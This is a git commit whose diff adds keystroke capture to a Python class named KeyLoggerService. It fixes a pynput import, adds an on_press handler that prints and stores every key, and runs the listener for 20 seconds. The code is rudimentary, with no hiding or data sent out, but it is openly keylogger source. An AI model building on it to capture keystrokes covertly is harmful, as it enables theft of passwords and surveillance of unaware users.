11230797f0b1af58a27acb844c422ba27f20de57
netanelfedida <fnati02@gmail.com>
2025-02-19 16:43:18 +0200

    [KeyLoggerService]: Update README file, insatall pynput package, Add on press function

--- KeyLoggerService/KeyLoggerService.py
+++ KeyLoggerService/KeyLoggerService.py
@@ -1,14 +1,28 @@
 from IKeylogger import IKeyLogger
-from pypunt import KEY, Listener
+from pynput.keyboard import Key, Listener
 
+import time
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.data = []
         self.listener = Listener(on_press=self.__on_press)
     
-    #The listener start to listen to everey press keybord
+    #The listener start to listen to everey press keyboard
     def start_logging(self):
         self.listener.start()
+    
+    #Add to data the press keyboard
+    def __on_press(self, key):
+        print(key)
+        self.data.append(key)
+
+
+
+logger = KeyLoggerService()
+logger.start_logging()
+time.sleep(20)
+
+
     
 
         
